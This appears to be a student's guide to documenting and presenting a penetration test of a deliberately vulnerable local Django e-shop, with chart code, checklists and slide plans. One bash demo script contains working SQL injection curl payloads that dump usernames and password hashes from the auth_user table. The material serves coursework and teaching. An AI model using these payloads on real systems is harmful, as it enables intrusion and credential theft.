# Enhanced Screenshot & Visual Documentation Guide

## 🎨 Professional Screenshot Creation Guide

### Εργαλεία για Professional Screenshots

#### 1. **Snagit** (Recommended - Professional)
- Annotations, callouts, effects
- Video recording capability
- Professional templates

#### 2. **Greenshot** (Free Alternative)
- Basic annotations
- Direct upload to imgur
- Obfuscation tools

#### 3. **Browser Extensions**
- **GoFullPage**: Full page screenshots
- **Nimbus**: Annotation tools
- **Awesome Screenshot**: Video + screenshot

### Screenshot Best Practices

```yaml
professional_screenshot:
  dimensions: 1920x1080 (Full HD)
  format: PNG (lossless)
  annotations:
    - Red arrows for vulnerabilities
    - Yellow highlights for important data
    - Numbered callouts for steps
    - Blur/pixelate sensitive data
  consistency:
    - Same browser (Chrome/Firefox)
    - Same theme (light/dark)
    - Same zoom level (100%)
    - Clean desktop (no personal items)
```

---

## 📊 Visual Diagrams & Infographics

### 1. Executive Dashboard Creation

**[DIAGRAM: Security Risk Dashboard]**
```python
import matplotlib.pyplot as plt
import seaborn as sns
import pandas as pd

# Create professional risk dashboard
fig, ((ax1, ax2), (ax3, ax4)) = plt.subplots(2, 2, figsize=(15, 10))
fig.suptitle('E-Shop Security Risk Dashboard', fontsize=16, fontweight='bold')

# 1. Risk Score Gauge
def create_gauge(ax, score, title):
    # Create semi-circular gauge
    theta = np.linspace(0, np.pi, 100)
    r = 1
    
    # Color zones
    ax.fill_between(theta[:33], 0, r, color='green', alpha=0.3)
    ax.fill_between(theta[33:66], 0, r, color='yellow', alpha=0.3)
    ax.fill_between(theta[66:], 0, r, color='red', alpha=0.3)
    
    # Needle
    needle_angle = np.pi * (score / 100)
    ax.plot([0, np.cos(needle_angle)], [0, np.sin(needle_angle)], 
            'k-', linewidth=3)
    
    ax.text(0, -0.2, f'{score}/100', ha='center', fontsize=20, fontweight='bold')
    ax.set_title(title, fontsize=14, pad=20)
    ax.set_xlim(-1.2, 1.2)
    ax.set_ylim(-0.2, 1.2)
    ax.axis('off')

create_gauge(ax1, 95, 'Overall Risk Score')

# 2. Vulnerability Distribution
vulns = ['SQL Injection', 'XSS', 'Auth', 'IDOR', 'CSRF']
severity = [10, 8, 9, 7, 6]
colors = ['#d62728', '#ff7f0e', '#d62728', '#ff7f0e', '#ff7f0e']

bars = ax2.barh(vulns, severity, color=colors)
ax2.set_xlabel('Severity Score')
ax2.set_title('Vulnerability Severity Distribution')
ax2.set_xlim(0, 10)

# Add value labels
for i, (bar, value) in enumerate(zip(bars, severity)):
    ax2.text(value + 0.1, i, f'{value}/10', va='center')

# 3. Timeline to Exploit
timeline_data = {
    'Vulnerability': vulns,
    'Minutes': [2, 5, 10, 3, 7]
}
df_timeline = pd.DataFrame(timeline_data)

ax3.bar(df_timeline['Vulnerability'], df_timeline['Minutes'], 
        color='darkred', alpha=0.7)
ax3.set_ylabel('Minutes to Exploit')
ax3.set_title('Time to Successful Exploitation')
ax3.axhline(y=15, color='green', linestyle='--', label='Target: >15 min')
ax3.legend()

# 4. Business Impact Heatmap
impact_data = np.array([
    [10, 9, 8, 10, 9],  # Confidentiality
    [10, 7, 6, 8, 9],   # Integrity
    [8, 5, 7, 5, 6],    # Availability
    [9, 8, 9, 9, 8]     # Compliance
])

impact_labels = ['Confidentiality', 'Integrity', 'Availability', 'Compliance']
sns.heatmap(impact_data, annot=True, fmt='d', cmap='RdYlGn_r',
            xticklabels=vulns, yticklabels=impact_labels, ax=ax4,
            cbar_kws={'label': 'Impact Score'}, vmin=0, vmax=10)
ax4.set_title('Business Impact Heatmap')

plt.tight_layout()
plt.savefig('security_dashboard.png', dpi=300, bbox_inches='tight')
```

### 2. Attack Flow Visualization

**[DIAGRAM: SQL Injection Attack Chain]**

```mermaid
graph LR
    A[Attacker] -->|1. Discovers /catalog| B[Search Function]
    B -->|2. Tests with '| C{SQL Error?}
    C -->|Yes| D[Confirms SQLi]
    D -->|3. UNION SELECT| E[Database Schema]
    E -->|4. Extract tables| F[auth_user table]
    F -->|5. Dump passwords| G[MD5 Hashes]
    G -->|6. Crack hashes| H[Plain Passwords]
    H -->|7. Login as admin| I[Full Access]
    
    style A fill:#f9f,stroke:#333,stroke-width:4px
    style I fill:#f66,stroke:#333,stroke-width:4px
    
    classDef vuln fill:#ff9999,stroke:#660000,stroke-width:2px
    class B,C,D vuln
```


### 3. Risk Matrix Visualization

```python
import numpy as np
import matplotlib.pyplot as plt

# Create Risk Matrix
fig, ax = plt.subplots(figsize=(10, 8))

# Define grid
likelihood = ['Rare', 'Unlikely', 'Possible', 'Likely', 'Almost Certain']
impact = ['Negligible', 'Minor', 'Moderate', 'Major', 'Catastrophic']

# Create color map
colors = np.array([
    [1, 1, 2, 3, 3],      # Rare
    [1, 2, 3, 4, 4],      # Unlikely
    [2, 3, 4, 4, 5],      # Possible
    [3, 4, 4, 5, 5],      # Likely
    [3, 4, 5, 5, 5]       # Almost Certain
])

# Color mapping
cmap_colors = ['#90EE90', '#FFFF00', '#FFA500', '#FF6347', '#DC143C']
cmap = plt.matplotlib.colors.ListedColormap(cmap_colors)

# Plot heatmap
im = ax.imshow(colors, cmap=cmap, aspect='auto')

# Add vulnerabilities
vulns_pos = {
    'SQL Injection': (4, 4),
    'XSS': (3, 3),
    'Authentication': (4, 3),
    'IDOR': (3, 3),
    'CSRF': (2, 3)
}

for vuln, (x, y) in vulns_pos.items():
    ax.scatter(y, x, s=500, c='black', marker='*')
    ax.annotate(vuln, (y, x), xytext=(10, 10), 
                textcoords='offset points', fontsize=10,
                bbox=dict(boxstyle='round,pad=0.3', facecolor='white', alpha=0.7))

# Customize
ax.set_xticks(np.arange(len(impact)))
ax.set_yticks(np.arange(len(likelihood)))
ax.set_xticklabels(impact)
ax.set_yticklabels(likelihood)
ax.set_xlabel('Impact', fontsize=14, fontweight='bold')
ax.set_ylabel('Likelihood', fontsize=14, fontweight='bold')
ax.set_title('Security Risk Matrix - E-Shop Application', fontsize=16, fontweight='bold')

# Add grid
ax.set_xticks(np.arange(len(impact))-.5, minor=True)
ax.set_yticks(np.arange(len(likelihood))-.5, minor=True)
ax.grid(which="minor", color="black", linestyle='-', linewidth=2)

# Legend
legend_elements = [plt.Rectangle((0,0),1,1, facecolor=c, edgecolor='black') 
                  for c in cmap_colors]
legend_labels = ['Low', 'Medium', 'High', 'Critical', 'Extreme']
ax.legend(legend_elements, legend_labels, loc='center left', bbox_to_anchor=(1, 0.5))

plt.tight_layout()
plt.savefig('risk_matrix.png', dpi=300, bbox_inches='tight')
```

---

## 🎬 Video Demonstration Scripts

### 1. SQL Injection Demo Video Script

```bash
#!/bin/bash
# sql_injection_demo.sh

echo "=== SQL Injection Demonstration ==="
echo "Target: E-Shop Application"
echo ""

# Step 1: Normal search
echo "[1] Testing normal search functionality..."
curl -s "http://localhost:8000/catalog/?q=laptop" | grep -A 5 "search-results"

sleep 2

# Step 2: SQL injection test
echo "[2] Testing for SQL injection vulnerability..."
curl -s "http://localhost:8000/catalog/?q='" | grep -i "error"

sleep 2

# Step 3: Extract database version
echo "[3] Extracting database information..."
curl -s "http://localhost:8000/catalog/?q=' UNION SELECT NULL,sqlite_version(),NULL,NULL,NULL,NULL,NULL--" | grep -A 5 "search-results"

sleep 2

# Step 4: Extract users
echo "[4] Dumping user credentials..."
curl -s "http://localhost:8000/catalog/?q=' UNION SELECT NULL,username,password,NULL,NULL,NULL,NULL FROM auth_user--" | grep -A 10 "search-results"

echo ""
echo "=== Demo Complete - Critical vulnerability confirmed ==="
```

### 2. Screen Recording Guide

```yaml
video_recording_setup:
  software:
    - OBS Studio (Free, professional)
    - Camtasia (Paid, easy editing)
    - QuickTime (Mac built-in)
    
  settings:
    resolution: 1920x1080
    fps: 30
    format: MP4 (H.264)
    audio: Include narration
    
  structure:
    1_intro:
      - Application overview
      - Vulnerability to demonstrate
      duration: 30s
      
    2_discovery:
      - Show normal functionality
      - Identify injection point
      duration: 60s
      
    3_exploitation:
      - Manual exploitation
      - Automated tools
      duration: 120s
      
    4_impact:
      - Show data extracted
      - Explain business impact
      duration: 60s
      
    5_remediation:
      - Show fixed code
      - Verify patch works
      duration: 30s
```

---

## 📸 Screenshot Checklist for Each Vulnerability

### SQL Injection Screenshots (10 required)

- [ ] 1. Normal search functionality
- [ ] 2. SQL error with single quote
- [ ] 3. Successful UNION injection
- [ ] 4. Database version extraction
- [ ] 5. Table enumeration
- [ ] 6. User credentials dump
- [ ] 7. SQLMap execution
- [ ] 8. SQLMap results
- [ ] 9. Burp Suite request/response
- [ ] 10. Fixed code comparison

### XSS Screenshots (8 required)

- [ ] 1. Reflected XSS alert box
- [ ] 2. Payload in URL
- [ ] 3. Stored XSS submission
- [ ] 4. Stored XSS execution
- [ ] 5. Cookie theft PoC
- [ ] 6. BeEF hook demonstration
- [ ] 7. DOM inspection showing unescaped content
- [ ] 8. Fixed implementation

### Authentication Screenshots (8 required)

- [ ] 1. Different error messages
- [ ] 2. Response time graph
- [ ] 3. Hydra brute force running
- [ ] 4. Successful password found
- [ ] 5. MD5 hash in database
- [ ] 6. Cracked password
- [ ] 7. No rate limiting proof
- [ ] 8. Fixed generic error

### IDOR Screenshots (6 required)

- [ ] 1. User's own order
- [ ] 2. URL manipulation
- [ ] 3. Another user's order accessed
- [ ] 4. Personal data exposed
- [ ] 5. Automated enumeration script
- [ ] 6. Access control fix

### CSRF Screenshots (6 required)

- [ ] 1. Missing CSRF token (view source)
- [ ] 2. Attack page HTML
- [ ] 3. Attack page in browser
- [ ] 4. Successful transfer
- [ ] 5. Network tab showing request
- [ ] 6. CSRF token implementation

---

## 🎯 Presentation Visual Aids

### PowerPoint Template Structure

```yaml
presentation_template:
  slide_1_title:
    background: Dark gradient
    content:
      - Report title (large, bold)
      - Your name and ID
      - Course: CDS201
      - Date
      - University logo
    animations: Fade in
    
  slide_2_agenda:
    layout: Two column
    left:
      - Numbered list of topics
    right:
      - Time allocation pie chart
    
  slide_3_executive_summary:
    layout: Dashboard style
    elements:
      - Risk gauge (critical)
      - Vulnerability count (5)
      - Potential loss (€6.5M)
      - Time to patch (48h)
    
  vulnerability_slides:
    template_per_vuln:
      - Title with severity badge
      - Split screen:
        - Left: Technical details
        - Right: Screenshot/demo
      - Bottom: Impact and fix
      
  risk_matrix_slide:
    - Full screen heatmap
    - Animated appearance of vulns
    
  recommendations_slide:
    timeline_graphic:
      - Immediate (red)
      - Short-term (yellow)
      - Long-term (green)
      
  closing_slide:
    call_to_action:
      - "Security is a journey, not a destination"
      - Contact information
      - Questions prompt
```

### Animation Guidelines

```css
/* CSS for web-based presentations */
.vulnerability-appear {
  animation: slideInDanger 1s ease-out;
}

@keyframes slideInDanger {
  from {
    transform: translateX(-100%);
    opacity: 0;
  }
  to {
    transform: translateX(0);
    opacity: 1;
    color: #dc3545;
  }
}

.impact-counter {
  animation: countUp 2s ease-out;
}

.risk-pulse {
  animation: pulse 2s infinite;
}

@keyframes pulse {
  0% {
    transform: scale(1);
    box-shadow: 0 0 0 0 rgba(220, 53, 69, 0.7);
  }
  50% {
    transform: scale(1.05);
    box-shadow: 0 0 0 10px rgba(220, 53, 69, 0);
  }
  100% {
    transform: scale(1);
  }
}
```

---

## 🚀 Quick Demo Setup

### All-in-One Demo Environment

```bash
#!/bin/bash
# setup_demo_env.sh

# Create demo directory structure
mkdir -p pentesting_demo/{screenshots,videos,reports,exploits}

# Start vulnerable app
cd secure_eshop
python manage.py runserver &
SERVER_PID=$!

# Wait for server
sleep 5

# Create test data
python manage.py shell << EOF
from django.contrib.auth.models import User
from eshop.models import Product, Order, ShippingAddress

# Create users
User.objects.create_user('victim1', 'victim1@test.com', 'password123')
User.objects.create_user('victim2', 'victim2@test.com', 'password123')
User.objects.create_user('attacker', 'attacker@test.com', 'hacked123')

# Create products
Product.objects.create(name='Laptop', price=999.99, stock=10)
Product.objects.create(name='Phone', price=699.99, stock=20)

print("Demo data created!")
EOF

# Open terminals for demos
gnome-terminal --tab --title="SQLMap" -- bash -c "cd pentesting_demo/exploits; bash"
gnome-terminal --tab --title="Hydra" -- bash -c "cd pentesting_demo/exploits; bash"
gnome-terminal --tab --title="Burp" -- bash -c "java -jar /opt/burpsuite/burpsuite.jar; bash"

echo "Demo environment ready!"
echo "Server PID: $SERVER_PID"
echo "Access app at: http://localhost:8000"
```

---

## 📋 Final Presentation Checklist

### Technical Setup
- [ ] Laptop charged 100%
- [ ] Backup laptop ready
- [ ] All files on USB drive
- [ ] Offline versions of all demos
- [ ] Network adapter (if needed)
- [ ] HDMI/DisplayPort adapter

### Content Ready
- [ ] 40+ screenshots organized
- [ ] Demo videos (with/without audio)
- [ ] Exploit scripts tested
- [ ] Presentation PDF backup
- [ ] Report printed (3 copies)

### Presentation Practice
- [ ] Timed run-through (<15 min)
- [ ] Key points memorized
- [ ] Transition sentences ready
- [ ] Q&A responses prepared
- [ ] Technical terms in Greek

### Contingency Plans
- [ ] Screenshots if demos fail
- [ ] Offline HTML pages
- [ ] Pre-recorded videos
- [ ] Simple explanations ready
- [ ] Contact info for follow-up

---

**Καλή Επιτυχία! You've got this! 🚀**